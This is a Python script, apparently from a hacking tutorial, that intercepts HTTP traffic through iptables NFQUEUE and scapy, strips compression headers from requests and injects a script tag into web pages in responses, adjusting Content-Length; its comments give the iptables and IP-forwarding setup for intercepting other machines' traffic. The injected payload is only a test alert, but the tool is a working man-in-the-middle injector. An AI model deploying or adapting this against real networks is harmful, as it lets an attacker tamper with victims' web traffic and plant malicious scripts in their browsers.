
# Before running this script, you need to bind traffic to queue 0 in iptables
# $ iptables -I INPUT -j NFQUEUE --queue-num 0
# $ iptables -I OUTPUT -j NFQUEUE --queue-num 0

# For spoofing remote machines you need forward traffic
# $ iptables -I FORWARD -j NFQUEUE --queue-num 0

# Enable IP forwarding
# $ echo 1 > /proc/sys/net/ipv4/ip_forward

import netfilterqueue
import scapy.all as scapy
import re

ackList = []

def setLoad(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def processPacket(packet):
	scapyPacket = scapy.IP(packet.get_payload())
	if scapyPacket.haslayer(scapy.Raw):
		load = scapyPacket[scapy.Raw].load
		if scapyPacket[scapy.TCP].dport == 80:
			print("[+] HTTP Request")
			load = re.sub("Accept-Encoding:.*?\r\n", "", str(load))
		elif scapyPacket[scapy.TCP].sport == 80:
			print("[+] HTTP Responce")
			injectionCode = "<script>alert('Testing');</script>"
			load = load.replace("</body>", injectionCode + "</body>")
			contentLengthSearch = re.search("(?:content-length:\s)(\d*)", load)
			if contentLengthSearch and "text/html" in load:
				contentLength = contentLengthSearch.group(1)
				newContentLength = int(contentLength) + len(injectionCode)
				load = load.replace(contentLength, str(newContentLength))

		if load != scapyPacket[scapy.Raw].load:
			newPacket = setLoad(scapyPacket, load)
			packet.set_payload(bytes(newPacket))
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket)
queue.run()